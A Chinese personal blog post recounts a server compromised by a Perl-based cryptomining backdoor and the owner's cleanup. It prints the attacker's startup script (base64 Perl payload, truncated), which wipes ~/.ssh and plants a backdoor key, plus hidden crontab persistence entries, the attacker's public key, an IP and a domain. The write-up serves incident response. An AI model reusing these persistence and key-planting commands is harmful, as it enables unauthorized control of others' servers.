---
title: 记一次服务器被黑植入挖矿脚本
tags:
  - Linux
abbrlink: d6da
date: 2019-11-14 17:37:07
---
不是吧，配置这么烂的服务器都要搞我？
<!-- more -->

```log
CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-core
MEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  
····
lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    ./cron
2020-01-15 16:17:54 CST
```

症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现`su root`居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl

clamav再扫一遍

```bash
nohup clamscan -r /root 2 >> err.out &
```

更新：

之前没清干净，貌似又被黑了

症状，运行`apt update`的时候

```
Errors were encountered while processing:
 clamav-freshclam
 clamav
E: Sub-process /usr/bin/dpkg returned an error code (1)
```

然而运行了一下freshclam

```bash
root@xi102:~# freshclam
Sat Mar  7 16:49:25 2020 -> ClamAV update process started at Sat Mar  7 16:49:25 2020
Sat Mar  7 16:49:25 2020 -> daily.cld database is up to date (version: 25743, sigs: 2209759, f-level: 63, builder: raynman)
Sat Mar  7 16:49:25 2020 -> main.cvd database is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
Sat Mar  7 16:49:25 2020 -> bytecode.cvd database is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
```

居然显示病毒库是最新的

可疑进程
/opt/atlassian/confluence/jre//bin/java -Djava.ut

然后看了一下有没有可疑的定时任务

```
root@xi102:~# crontab -l
0 0 */3 * * /root/.bashtemp/a/upd>/dev/null 2>&1
@reboot /root/.bashtemp/a/upd>/dev/null 2>&1
5 8 * * 0 /root/.bashtemp/b/sync>/dev/null 2>&1
@reboot /root/.bashtemp/b/sync>/dev/null 2>&1
0 0 */3 * * /tmp/.X19-unix/.rsync/c/aptitude>/dev/null 2>&1
```

那个tmp下面有的时候是`0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude>/dev/null 2>&1`

这个`.X某某-unix`应该是想伪装成`.X11-unix`X11转发的临时文件

root@xi102:~/.bashtemp# ps aux | grep cron
root     140526  0.0  0.0  12944  1028 pts/1    S+   17:16   0:00 grep --color=auto cron

看了一下这个目录下面，有鬼，应该就是它了

```
root@xi102:~/.bashtemp# ls
a  b  cron.d  dir2.dir
```

谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说
http://blog.itpub.net/31559758/viewspace-2667801/
https://www.anquanke.com/post/id/197662
更新，又看到几个的 http://m.lanhusoft.com/Article/745.html
https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2
把这个文件夹拉下来，可以看到里面有个run文件

```bash
#!/bin/sh
nohup ./stop>>/dev/null &
sleep 5
echo "ZXZhbCB1bnBh....这里太长略过..." | base64 --decode | perl
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3N...
这里一段密钥太长略过...fckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh
```

这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来

rsa：

```
AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```

perl脚本（base64解码之后）：

```
eval unpack u=>q{_"FUY(...中间这一段还是太长略过...}
```

使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了[^4]
(按照挖矿佬的风俗是不是应该放到pastebin上？)

我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个[perl的脚本](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-hacking-groups-botnet-observed-spreading-miner-perl-based-backdoor/)，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在`\tmp\`下面产生一个[dota3文件](https://blogs.juniper.net/en-us/threat-research/dota3-is-your-internet-of-things-device-moonlighting)

看到了一个可疑的欧洲IP：45.9.148.125
和一个可疑的网站：www.minpop.com

干掉定时任务`crontab -e`,把上面那几条定时任务全删了
删除`~/.ssh`目录底下可疑的authorized_keys
删除定时任务中的可疑文件夹`.bashtemp`和`.X21-unix`